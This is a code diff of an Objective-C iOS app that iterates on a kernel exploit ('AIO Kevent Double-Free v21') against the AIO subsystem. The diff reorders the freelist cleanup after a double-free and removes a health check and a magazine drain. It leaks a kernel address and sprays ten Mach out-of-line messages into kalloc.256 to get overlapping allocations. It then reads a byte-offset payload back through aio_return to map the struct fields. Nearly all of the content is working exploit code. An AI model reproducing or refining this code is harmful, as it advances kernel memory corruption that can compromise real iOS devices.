@@ -5733,7 +5733,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Kevent Double-Free v20 =========="];
+    [self appendLog:@"\n========== AIO Kevent Double-Free v21 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5863,151 +5863,38 @@ static void *e2_free_and_ool_racer(void *arg) {
             self.leakedKernelAddr = kev.ident;
             [self appendLog:[NSString stringWithFormat:@"  leaked kernel addr: 0x%llx", self.leakedKernelAddr]];
 
-            // Clean up reclaim entries
-            for (int i = 0; i < AIO_NRECLAIM; i++) {
+            // v21: REVERSE cleanup — free rcbs[6..0] so Y's two copies
+            // (kevent64 free + aio_return(&rcbs[0])) end up adjacent on freelist.
+            for (int i = AIO_NRECLAIM - 1; i >= 0; i--) {
                 if (aio_error(&rcbs[i]) != EINVAL) aio_return(&rcbs[i]);
             }
             close(kq);
             break;  // SUCCESS
         } else {
             [self appendLog:[NSString stringWithFormat:@"  kevent64 timeout (nev=%d)", nev]];
-            for (int i = 0; i < AIO_NRECLAIM; i++) {
+            for (int i = AIO_NRECLAIM - 1; i >= 0; i--) {
                 if (aio_error(&rcbs[i]) != EINVAL) aio_return(&rcbs[i]);
             }
             close(kq);
         }
     }
 
-    // ---- Post-exploit sanity: check AIO subsystem health ----
-    // After double-free, can we still allocate AIO entries? If so, the freelist
-    // corruption can be exploited for overlapping allocations (AIO + non-AIO).
-    [self appendLog:@"\n--- Post-double-free AIO health check ---"];
-    {
-        static struct aiocb hcbs[4];
-        static char hbufs[4][4096];
-        int hok = 0;
-        for (int i = 0; i < 4; i++) {
-            memset(&hcbs[i], 0, sizeof(hcbs[i]));
-            hcbs[i].aio_fildes = fd;
-            hcbs[i].aio_buf = hbufs[i];
-            hcbs[i].aio_nbytes = 512;
-            hcbs[i].aio_offset = 0;
-            hcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
-            if (aio_read(&hcbs[i]) == 0) hok++;
-        }
-        [self appendLog:[NSString stringWithFormat:@"  Post-UAF aio_read: %d/4 succeeded", hok]];
-        if (hok > 0) {
-            [self appendLog:@"  >> AIO subsystem still functional — overlapping alloc attack viable <<"];
-            for (int i = 0; i < 4; i++) {
-                if (aio_error(&hcbs[i]) != EINVAL && aio_error(&hcbs[i]) != -1) {
-                    while (aio_error(&hcbs[i]) == EINPROGRESS) usleep(100);
-                    aio_return(&hcbs[i]);
-                }
-            }
-        } else {
-            [self appendLog:@"  >> AIO subsystem DEAD after double-free — need alternate approach <<"];
-        }
-    }
+    // v21: SKIP health check — don't insert 4 entries between Y's two copies.
+    // In v20 the health check alloc+free pushed Y's copies apart, preventing overlap.
+    // AIO subsystem health was already confirmed working in v10-v20.
 
-    // ---- Phase D: Magazine drain + OOL overlap ----
-    // After cleanup, the double-freed slot is buried under ~10 normal free
-    // entries in the per-CPU magazine (LIFO). Drain the magazine with mach
-    // OOL spray (kalloc.256), then test overlap with AIO alloc + OOL spray.
-    // SAFE: no kevent64 call after overlap → no filt_aioprocess → no panic.
+    // ---- v21: 10x OOL spray (NO drain) + reverse-cleanup freelist ordering ----
+    // Reverse Phase A cleanup places Y's two copies adjacent on the freelist.
+    // No drain = no consumption of Y copies. No health check = no extra entries.
+    // E2 takes Y's first copy; 10 OOL sprays hit Y's second copy → overlap.
+    // aio_return reads live entry fields — SAFE, no kevent, no procp deref.
 
-    [self appendLog:@"\n--- Phase D: Magazine drain + OOL overlap ---"];
+    [self appendLog:@"\n--- Phase D v21: 10x OOL spray (no drain) ---"];
 
-    // Create 8 drain ports + 1 dedicated overlap port. 3 msgs each = fits in qlimit=5.
-    // Strategy: allocate recv port, then allocate a DUMMY port to steal its name
-    // for the send right. This way recv right stays at original name, send right
-    // lives at the dummy's old name. (mach_port_insert_right at SAME name kills recv.)
-    // v20: reduce drain to 9 (3×3) so magazine isn't fully depleted.
-    // With 24 drain msgs the magazine emptied and E2 got a fresh slab,
-    // missing the double-freed slot. 9 drains past reclaim+health entries
-    // but leaves the double-freed slot near the freelist head.
-    enum { kDrainPorts = 3, kDrainMsgsPerPort = 3, kDrainTotal = kDrainPorts * kDrainMsgsPerPort };
-    mach_port_t drainRecv[kDrainPorts];
-    mach_port_t drainSend[kDrainPorts];
-    int drainPortsReady = 0;
-
-    // extract_right(MAKE_SEND) creates valid send right at NEW name.
-    // v12 confirmed: sends work (24/24). v13 confirmed: destroy+insert doesn't work.
-    //
-    // Recv diagnostic: also test basic recv with msgh_local_port=0 (NULL).
-    mach_port_t testRecv = MACH_PORT_NULL, testSend = MACH_PORT_NULL;
-    {
-        mach_msg_type_name_t poly = 0;
-        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &testRecv) == KERN_SUCCESS &&
-            mach_port_extract_right(mach_task_self_, testRecv, MACH_MSG_TYPE_MAKE_SEND, &testSend, &poly) == KERN_SUCCESS) {
-            // Send a simple message to the port
-            mach_msg_header_t sm = {0};
-            sm.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
-            sm.msgh_size = sizeof(sm);
-            sm.msgh_remote_port = testSend;
-            if (mach_msg(&sm, MACH_SEND_MSG, sizeof(sm), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL) == MACH_MSG_SUCCESS) {
-                // Try recv with msgh_local_port=0 (ALL ports) + 100ms timeout
-                mach_msg_header_t rm = {0};
-                rm.msgh_size = sizeof(rm);
-                kern_return_t rkr = mach_msg(&rm, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(rm), testRecv, 100, MACH_PORT_NULL);
-                if (rkr == MACH_MSG_SUCCESS) {
-                    [self appendLog:[NSString stringWithFormat:@"  DIAG: recv OK (extract_right works) recv=%d send=%d", testRecv, testSend]];
-                } else if (rkr == MACH_RCV_TIMED_OUT) {
-                    [self appendLog:@"  DIAG: recv TIMED OUT — msg not delivered? (extract_right may have killed recv right)"];
-                } else {
-                    [self appendLog:[NSString stringWithFormat:@"  DIAG: recv FAIL kr=0x%x — extract_right kills recv on iOS 26.2?", rkr]];
-                }
-            } else {
-                [self appendLog:@"  DIAG: test send FAILED"];
-            }
-        }
-    }
-    // Clean up diagnostic ports — use the stored send right if valid
-    if (testRecv != MACH_PORT_NULL && testSend != MACH_PORT_NULL) {
-        // Reuse as first drain port
-        drainRecv[0] = testRecv;
-        drainSend[0] = testSend;
-        drainPortsReady = 1;
-    } else if (testRecv != MACH_PORT_NULL) {
-        mach_port_destroy(mach_task_self_, testRecv);
-    }
-
-    // Create remaining drain ports with extract_right
-    for (int p = drainPortsReady; p < kDrainPorts; p++) {
-        drainRecv[p] = MACH_PORT_NULL;
-        drainSend[p] = MACH_PORT_NULL;
-        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &drainRecv[p]) == KERN_SUCCESS) {
-            mach_msg_type_name_t poly = 0;
-            if (mach_port_extract_right(mach_task_self_, drainRecv[p],
-                MACH_MSG_TYPE_MAKE_SEND, &drainSend[p], &poly) == KERN_SUCCESS) {
-                drainPortsReady++;
-            } else {
-                mach_port_destroy(mach_task_self_, drainRecv[p]);
-                drainRecv[p] = MACH_PORT_NULL;
-            }
-        }
-    }
-
-    // Overlap port with extract_right
-    mach_port_t overlapRecv = MACH_PORT_NULL, overlapSend = MACH_PORT_NULL;
-    if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &overlapRecv) == KERN_SUCCESS) {
-        mach_msg_type_name_t poly = 0;
-        if (mach_port_extract_right(mach_task_self_, overlapRecv,
-            MACH_MSG_TYPE_MAKE_SEND, &overlapSend, &poly) != KERN_SUCCESS) {
-            mach_port_destroy(mach_task_self_, overlapRecv);
-            overlapRecv = MACH_PORT_NULL;
-        }
-    }
-    [self appendLog:[NSString stringWithFormat:@"  Drain ports: %d/%d ready", drainPortsReady, kDrainPorts]];
-
-    // OOL payload: each byte = its own offset (for field mapping via side-channel)
-    // When OOL overwrites E1's AIO entry, aio_error() and aio_return() read
-    // specific fields. By setting payload[off] = off, the returned values
-    // directly reveal which byte offsets map to each AIO field.
+    // OOL payload: byte-offset pattern for field mapping
     enum { kDrainOolSize = 256 };
     uint8_t *drainPayload = (uint8_t *)calloc(1, kDrainOolSize);
     if (drainPayload) {
-        // Byte-offset pattern: payload[i]=i — kevent64 ext[0],ext[1] reveal
-        // exact byte offsets of errorval and returnval in AIO entry struct.
         for (int i = 0; i < kDrainOolSize; i++) drainPayload[i] = (uint8_t)i;
     }
 
@@ -6017,69 +5904,73 @@ static void *e2_free_and_ool_racer(void *arg) {
         mach_msg_ool_descriptor_t ool;
     } DrainMsg;
 
-    // Pre-fill all drain ports with OOL messages
-    int drainSent = 0;
-    for (int p = 0; p < drainPortsReady && drainPayload; p++) {
-        for (int m = 0; m < kDrainMsgsPerPort; m++) {
-            DrainMsg msg;
-            memset(&msg, 0, sizeof(msg));
-            msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
-            msg.header.msgh_size = sizeof(DrainMsg);
-            msg.header.msgh_remote_port = drainSend[p];
-            msg.header.msgh_id = (mach_msg_id_t)(p * kDrainMsgsPerPort + m);
-            msg.body.msgh_descriptor_count = 1;
-            msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
-            msg.ool.address = drainPayload;
-            msg.ool.size = kDrainOolSize;
-            msg.ool.deallocate = FALSE;
-            msg.ool.copy = MACH_MSG_PHYSICAL_COPY;
-            if (mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL) == MACH_MSG_SUCCESS) {
-                drainSent++;
+    // Create 10 OOL spray ports (no drain — all used for overlap spray after E2)
+    enum { kOolPorts = 10 };
+    mach_port_t oolRecv[kOolPorts];
+    mach_port_t oolSend[kOolPorts];
+    int oolPortsReady = 0;
+    for (int p = 0; p < kOolPorts; p++) {
+        oolRecv[p] = MACH_PORT_NULL;
+        oolSend[p] = MACH_PORT_NULL;
+        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &oolRecv[p]) == KERN_SUCCESS) {
+            mach_msg_type_name_t poly = 0;
+            if (mach_port_extract_right(mach_task_self_, oolRecv[p],
+                MACH_MSG_TYPE_MAKE_SEND, &oolSend[p], &poly) == KERN_SUCCESS) {
+                oolPortsReady++;
+            } else {
+                mach_port_destroy(mach_task_self_, oolRecv[p]);
+                oolRecv[p] = MACH_PORT_NULL;
             }
         }
     }
-    [self appendLog:[NSString stringWithFormat:@"  Magazine drain: %d/%d OOL msgs sent (kalloc.256 consumed)", drainSent, kDrainTotal]];
+    [self appendLog:[NSString stringWithFormat:@"  OOL spray ports: %d/%d ready", oolPortsReady, kOolPorts]];
 
-    // ---- v20: SIGEV_NONE E2 + double-free OOL overlap → aio_return side channel ----
-    // No kevent → no filt_aioprocess → no crash risk from procp dereference.
-    // E2 uses SIGEV_NONE (no knote at all), so OOL can overwrite the entry
-    // via double-free without risk. aio_return reads live entry fields:
-    // returnval(@+0x20) and errorval(@+0x28) from the (possibly overlapped) slot.
-    // byte-offset payload: ext[0]=0x2F..28, ext[1]=0x27..20
+    // ---- v21: E2 with SIGEV_NONE + 10x OOL spray via double-free overlap ----
+    // E2 takes Y's first copy from freelist head. 10 OOL sprays sweep through
+    // the freelist — one must hit Y's second copy (same physical address).
+    // Reverse cleanup ensures Y's two copies are ~6 reclaim entries apart.
+    // aio_return reads LIVE entry fields → returnval=0x27..20 if overlapped.
     {
         static struct aiocb e2;
         static char e2buf[256];
         memset(&e2, 0, sizeof(e2));
         e2.aio_fildes = fd;
         e2.aio_buf = e2buf;
-        e2.aio_nbytes = 1;  // minimal copy — safe even if bufptr corrupted
+        e2.aio_nbytes = 0xE2E2;  // distinct marker — easy to spot if overlap misses
         e2.aio_offset = 0;
         e2.aio_lio_opcode = LIO_READ;
         e2.aio_sigevent.sigev_notify = SIGEV_NONE;  // NO kevent → no crash
         int e2ok = (aio_read(&e2) == 0);
         [self appendLog:[NSString stringWithFormat:@"  E2 aio_read(SIGEV_NONE): %@", e2ok ? @"OK" : @"FAIL"]];
-        if (e2ok && drainPayload && overlapSend != MACH_PORT_NULL) {
+        if (e2ok && drainPayload && oolPortsReady > 0) {
             while (aio_error(&e2) == EINPROGRESS) usleep(100);
             [self appendLog:[NSString stringWithFormat:@"  E2 done, aio_error=%d", aio_error(&e2)]];
 
-            // Send OOL overlap — double-free means slot X is on freelist twice.
-            // E2 got the first copy; OOL should get the second → overlapping alloc!
-            DrainMsg ool;
-            memset(&ool, 0, sizeof(ool));
-            ool.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
-            ool.header.msgh_size = sizeof(ool);
-            ool.header.msgh_remote_port = overlapSend;
-            ool.header.msgh_id = 0xE200;
-            ool.body.msgh_descriptor_count = 1;
-            ool.ool.type = MACH_MSG_OOL_DESCRIPTOR;
-            ool.ool.address = drainPayload;
-            ool.ool.size = kDrainOolSize;
-            ool.ool.deallocate = FALSE;
-            ool.ool.copy = MACH_MSG_PHYSICAL_COPY;
-            kern_return_t okr = mach_msg(&ool.header, MACH_SEND_MSG, sizeof(ool), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
-            [self appendLog:[NSString stringWithFormat:@"  OOL overlap send: kr=%d", okr]];
+            // Send 10x OOL spray — each to a different port, each kalloc.256.
+            // With reverse cleanup, Y's two copies are ~6 reclaim entries apart.
+            // E2 took Y-first-copy; 10 sprays sweep through the freelist
+            // and one must hit Y-second-copy (same physical address → OVERLAP).
+            int oolSent = 0;
+            for (int p = 0; p < oolPortsReady; p++) {
+                DrainMsg ool;
+                memset(&ool, 0, sizeof(ool));
+                ool.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+                ool.header.msgh_size = sizeof(ool);
+                ool.header.msgh_remote_port = oolSend[p];
+                ool.header.msgh_id = 0xE200 + p;
+                ool.body.msgh_descriptor_count = 1;
+                ool.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+                ool.ool.address = drainPayload;
+                ool.ool.size = kDrainOolSize;
+                ool.ool.deallocate = FALSE;
+                ool.ool.copy = MACH_MSG_PHYSICAL_COPY;
+                if (mach_msg(&ool.header, MACH_SEND_MSG, sizeof(ool), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL) == MACH_MSG_SUCCESS) {
+                    oolSent++;
+                }
+            }
+            [self appendLog:[NSString stringWithFormat:@"  OOL spray: %d/%d sent", oolSent, oolPortsReady]];
 
-            // Read back via aio_error + aio_return (live entry fields, not cached)
+            // Read back via aio_error + aio_return
             int err = aio_error(&e2);
             ssize_t retv = aio_return(&e2);
             [self appendLog:[NSString stringWithFormat:@"  aio_error=%d", err]];
@@ -6088,15 +5979,15 @@ static void *e2_free_and_ool_racer(void *arg) {
             if (retv == (ssize_t)0x2726252423222120ULL) {
                 [self appendLog:@"  >> CONFIRMED: OOL overlap + aio_return read! <<"];
                 [self appendLog:@"  >> returnval @+0x20, errorval @+0x28 mapped <<"];
-            } else if (retv == 1) {
-                [self appendLog:@"  >> aio_return=1 (original nbytes) — overlap missed slot <<"];
+            } else if (retv == 0xE2E2) {
+                [self appendLog:@"  >> aio_return=0xE2E2 (original nbytes) — overlap missed slot <<"];
             } else if (retv > 0 && retv < 256) {
-                [self appendLog:[NSString stringWithFormat:@"  >> returnval=0x%llx — partial overlap or shifted field <<", (unsigned long long)retv]];
+                [self appendLog:[NSString stringWithFormat:@"  >> returnval=0x%llx — partial or shifted overlap <<", (unsigned long long)retv]];
             } else {
                 [self appendLog:[NSString stringWithFormat:@"  >> unexpected=0x%llx — check byte-offset alignment <<", (unsigned long long)retv]];
             }
         } else {
-            [self appendLog:[NSString stringWithFormat:@"  E2 SKIP: e2ok=%d payload=%p overlapSend=0x%x", e2ok, drainPayload, overlapSend]];
+            [self appendLog:[NSString stringWithFormat:@"  E2 SKIP: e2ok=%d payload=%p ports=%d", e2ok, drainPayload, oolPortsReady]];
             if (e2ok) {
                 while (aio_error(&e2) == EINPROGRESS) usleep(100);
                 aio_return(&e2);
@@ -6104,14 +5995,10 @@ static void *e2_free_and_ool_racer(void *arg) {
         }
     }
 
-    // Destroy all drain ports (no recv possible — extract_right killed recv rights)
-    for (int p = 0; p < drainPortsReady; p++) {
-        mach_port_destroy(mach_task_self_, drainRecv[p]);
-        mach_port_deallocate(mach_task_self_, drainSend[p]);
-    }
-    if (overlapRecv != MACH_PORT_NULL) {
-        mach_port_destroy(mach_task_self_, overlapRecv);
-        mach_port_deallocate(mach_task_self_, overlapSend);
+    // Destroy all OOL spray ports
+    for (int p = 0; p < oolPortsReady; p++) {
+        mach_port_destroy(mach_task_self_, oolRecv[p]);
+        mach_port_deallocate(mach_task_self_, oolSend[p]);
     }
     free(drainPayload);
 
